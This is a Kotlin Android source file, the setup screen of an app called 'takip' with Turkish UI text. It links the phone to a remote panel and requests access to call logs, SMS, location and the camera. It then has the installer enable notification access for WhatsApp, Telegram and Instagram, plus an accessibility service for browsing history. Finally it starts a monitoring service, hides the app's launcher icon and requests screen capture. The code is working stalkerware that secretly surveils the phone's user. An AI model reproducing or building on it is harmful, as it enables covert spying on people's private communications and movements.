package com.takip.app.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.takip.app.databinding.ActivitySetupBinding
import com.takip.app.service.MonitoringService
import com.takip.app.ui.ScreenCaptureActivity
import com.takip.app.util.AppHider
import com.takip.app.util.ConfigManager
import com.takip.app.util.DeviceUtils
import com.takip.app.util.PrefsManager
import com.takip.app.api.ApiClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private var permissionsRequested = false

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (PrefsManager.isSetupComplete && PrefsManager.isHidden) {
            finish()
            return
        }

        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (PrefsManager.isSetupComplete && !PrefsManager.isHidden) {
            showSuccessDialog(hideAfter = true)
            return
        }

        binding.connectButton.setOnClickListener { connectDevice() }
    }

    private fun connectDevice() {
        val panelUrl = binding.panelUrlInput.text?.toString()?.trim() ?: ""
        val email = binding.emailInput.text?.toString()?.trim() ?: ""
        val password = binding.passwordInput.text?.toString() ?: ""
        val deviceName = binding.deviceNameInput.text?.toString()?.trim() ?: "Telefon"

        if (panelUrl.isEmpty()) {
            showError("Panel adresi gerekli")
            return
        }
        if (email.isEmpty() || password.isEmpty()) {
            showError("E-posta ve şifre gerekli")
            return
        }

        binding.connectButton.isEnabled = false
        binding.progressBar.visibility = View.VISIBLE
        binding.errorText.visibility = View.GONE

        lifecycleScope.launch {
            val discoverResult = withContext(Dispatchers.IO) {
                ConfigManager.discoverApiUrl(panelUrl)
            }

            if (discoverResult.isFailure) {
                binding.progressBar.visibility = View.GONE
                binding.connectButton.isEnabled = true
                val msg = discoverResult.exceptionOrNull()?.message ?: "Sunucu bulunamadı"
                showError("$msg\n\nPanel: $panelUrl\nTelefon ve PC aynı Wi-Fi'de olmalı.")
                return@launch
            }

            val result = withContext(Dispatchers.IO) {
                ApiClient.registerDevice(
                    email, password, deviceName, DeviceUtils.getAndroidId(this@SetupActivity)
                )
            }

            binding.progressBar.visibility = View.GONE
            binding.connectButton.isEnabled = true

            result.onSuccess { response ->
                PrefsManager.deviceToken = response.deviceToken
                PrefsManager.deviceId = response.deviceId
                PrefsManager.userEmail = email
                PrefsManager.isSetupComplete = true
                requestPermissionsAfterSetup()
                showSuccessDialog(hideAfter = false)
            }.onFailure { e ->
                showError(e.message ?: "Bağlantı başarısız")
            }
        }
    }

    private fun requestPermissionsAfterSetup() {
        if (permissionsRequested) return
        permissionsRequested = true

        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        }
    }

    private fun showSuccessDialog(hideAfter: Boolean) {
        val xiaomiNote = if (isXiaomiDevice()) {
            "\n\nXiaomi/MIUI: Ayarlar → Uygulamalar → Sistem Servisi → Otomatik başlat AÇ, Pil tasarrufu KAPAT."
        } else ""

        AlertDialog.Builder(this)
            .setTitle("Kurulum Tamamlandı")
            .setMessage(
                "Cihaz panele bağlandı.\n\n" +
                "ÖNEMLİ: Sonraki ekranlarda şunları AÇIN:\n" +
                "1) Bildirim erişimi (WhatsApp, Telegram, Instagram)\n" +
                "2) Erişilebilirlik servisi (internet geçmişi)\n" +
                "3) Pil optimizasyonunu kapatın\n\n" +
                "Tamam'a basınca uygulama gizlenecek.\n" +
                "Gizli menü: tarayıcıda takip://settings$xiaomiNote"
            )
            .setCancelable(false)
            .setPositiveButton("Tamam") { _, _ ->
                MonitoringService.start(this)
                if (hideAfter || !PrefsManager.isHidden) {
                    AppHider.hideLauncherIcon(this)
                }
                requestNotificationAccessOptional()
                requestBatteryOptimizationOptional()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ScreenCaptureActivity.request(this)
                }
                finish()
            }
            .show()
    }

    private fun isXiaomiDevice(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco")
    }

    private fun requestNotificationAccessOptional() {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            ?.contains(packageName) == true
        if (!enabled) {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
        if (!isAccessibilityEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            ?: return false
        return enabled.contains(packageName)
    }

    private fun requestBatteryOptimizationOptional() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                // Bazı cihazlarda desteklenmez
            }
        }
    }

    private fun showError(msg: String) {
        binding.errorText.text = msg
        binding.errorText.visibility = View.VISIBLE
    }
}
